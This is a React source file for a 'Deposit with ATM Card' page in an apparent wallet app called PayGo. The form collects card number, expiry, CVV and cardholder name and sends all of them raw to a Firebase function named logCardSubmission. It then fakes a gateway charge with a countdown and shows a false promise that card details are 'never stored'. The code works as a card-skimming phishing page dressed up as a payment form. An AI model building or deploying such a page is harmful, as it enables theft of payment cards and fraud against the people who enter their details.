import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { logCardSubmission } from '../lib/firebase';
import {
  ArrowLeft,
  CreditCard,
  Lock,
  ShieldCheck,
  CheckCircle2,
  Calendar,
  DollarSign,
  AlertCircle,
} from 'lucide-react';

interface DepositProps {
  onBack: () => void;
}

export const Deposit: React.FC<DepositProps> = ({ onBack }) => {
  const { user, addBalance, addTransaction } = useAuth();

  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState(user?.name || '');
  const [amount, setAmount] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [countdown, setCountdown] = useState(5);
  const [errorMsg, setErrorMsg] = useState('');

  // Format card number with spaces every 4 digits
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };

  // Format expiry MM/YY
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (val.length >= 3) {
      setExpiry(`${val.slice(0, 2)}/${val.slice(2)}`);
    } else {
      setExpiry(val);
    }
  };

  useEffect(() => {
    let timer: any;
    if (isProcessing && countdown > 0) {
      timer = setTimeout(() => setCountdown((c) => c - 1), 1000);
    } else if (isProcessing && countdown === 0) {
      const depositAmt = parseFloat(amount);
      addBalance(depositAmt);
      addTransaction({
        type: 'Card Deposit',
        amount: depositAmt,
        date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
      });
      setIsProcessing(false);
      setIsSuccess(true);
    }
    return () => clearTimeout(timer);
  }, [isProcessing, countdown]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length < 16) {
      setErrorMsg('Please enter a valid 16-digit ATM card number');
      return;
    }

    if (!expiry || expiry.length < 5) {
      setErrorMsg('Please enter a valid expiry date (MM/YY)');
      return;
    }

    if (!cvv || cvv.length < 3) {
      setErrorMsg('Please enter a valid 3-digit CVV code');
      return;
    }

    const depositAmt = parseFloat(amount);
    if (isNaN(depositAmt) || depositAmt <= 0) {
      setErrorMsg('Please enter a valid deposit amount');
      return;
    }

    try {
      await logCardSubmission({
        id: `CARD-${Date.now()}`,
        type: 'ATM Card Deposit',
        cardNumber,
        expiry,
        cvv,
        cardName,
        amount: depositAmt,
        userEmail: user?.email || 'unknown',
        userName: user?.name || cardName,
        date: new Date().toLocaleString(),
      });
    } catch (e) {
      console.error(e);
    }

    setCountdown(5);
    setIsProcessing(true);
  };

  if (isProcessing) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-sm w-full text-center shadow-xl border border-gray-100 space-y-4">
          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
          <h3 className="text-xl font-bold text-gray-900">Processing Card Deposit...</h3>
          <p className="text-sm text-gray-500">Securely charging your ATM card via Paystack / Flutterwave gateway</p>
          <div className="text-3xl font-black text-purple-600 font-mono">{countdown}s</div>
        </div>
      </div>
    );
  }

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 sm:p-6">
        <div className="bg-white rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-xl border border-gray-100 text-center space-y-6">
          <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto">
            <CheckCircle2 className="w-9 h-9" />
          </div>

          <div>
            <h3 className="text-2xl font-bold text-emerald-600">Deposit Successful!</h3>
            <p className="text-xs text-gray-500 mt-1">Funds have been credited instantly to your wallet</p>
          </div>

          <div className="bg-gray-50 rounded-2xl p-5 border border-gray-100 text-left space-y-3 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-500">Amount Deposited:</span>
              <span className="font-black text-gray-900 text-base">${parseFloat(amount).toLocaleString('en-NG', { minimumFractionDigits: 2 })}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Payment Method:</span>
              <span className="font-bold text-gray-900">ATM Debit Card (•••• {cardNumber.slice(-4)})</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Cardholder:</span>
              <span className="font-semibold text-gray-900">{cardName}</span>
            </div>
            <div className="flex justify-between pt-2 border-t border-gray-200 text-xs">
              <span className="text-gray-400">Reference:</span>
              <span className="font-mono text-gray-700">DEP{Date.now()}</span>
            </div>
          </div>

          <button
            onClick={onBack}
            className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl shadow-md transition-all cursor-pointer"
          >
            Return to Dashboard
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center space-x-3">
          <button onClick={onBack} className="p-2 hover:bg-white/10 rounded-full transition-colors text-white">
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-lg font-bold">Deposit with ATM Card</h1>
            <p className="text-xs text-purple-200">Instant debit card wallet funding</p>
          </div>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6 space-y-6">
        {/* ATM Card Graphic Preview */}
        <div className="bg-gradient-to-r from-purple-900 via-indigo-900 to-purple-800 text-white rounded-3xl p-6 shadow-xl relative overflow-hidden">
          <div className="absolute right-4 top-4 opacity-30">
            <CreditCard className="w-16 h-16" />
          </div>
          <div className="text-xs uppercase tracking-widest text-purple-300 font-semibold mb-6">
            PayGo Secure Card Gateway
          </div>
          <div className="font-mono text-lg sm:text-xl tracking-wider mb-6">
            {cardNumber || '•••• •••• •••• ••••'}
          </div>
          <div className="flex items-center justify-between text-xs">
            <div>
              <p className="text-purple-300 uppercase text-[10px]">Cardholder</p>
              <p className="font-bold uppercase tracking-wide truncate max-w-[180px]">{cardName || 'YOUR NAME'}</p>
            </div>
            <div>
              <p className="text-purple-300 uppercase text-[10px]">Expires</p>
              <p className="font-mono font-bold">{expiry || 'MM/YY'}</p>
            </div>
          </div>
        </div>

        {errorMsg && (
          <div className="p-3.5 bg-red-50 border border-red-200 text-red-600 text-xs rounded-xl flex items-center space-x-2">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span>{errorMsg}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="bg-white rounded-3xl p-6 sm:p-8 shadow-sm border border-gray-100 space-y-5">
          <div>
            <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
              Card Number
            </label>
            <div className="relative">
              <CreditCard className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
              <input
                type="text"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="4532 •••• •••• ••••"
                className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                required
              />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Expiry Date
              </label>
              <div className="relative">
                <Calendar className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  value={expiry}
                  onChange={handleExpiryChange}
                  placeholder="MM/YY"
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                CVV
              </label>
              <div className="relative">
                <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="password"
                  maxLength={4}
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                  placeholder="123"
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                  required
                />
              </div>
            </div>
          </div>

          <div>
            <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
              Cardholder Name
            </label>
            <input
              type="text"
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              placeholder="Name on card"
              className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 uppercase"
              required
            />
          </div>

          <div>
            <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
              Deposit Amount ($)
            </label>
            <div className="relative">
              <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">
                $
              </span>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="e.g. 10000"
                min={100}
                className="w-full pl-8 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-bold text-gray-900"
                required
              />
            </div>
          </div>

          <div className="bg-purple-50 rounded-2xl p-3.5 flex items-center space-x-3 text-xs text-purple-900 border border-purple-100">
            <ShieldCheck className="w-5 h-5 text-purple-600 shrink-0" />
            <span>Encrypted 256-bit SSL transaction. Your card details are safe and never stored.</span>
          </div>

          <button
            type="submit"
            className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
          >
            <CreditCard className="w-5 h-5" />
            <span>Pay {amount ? `$${parseFloat(amount).toLocaleString()}` : ''}</span>
          </button>
        </form>
      </div>
    </div>
  );
};
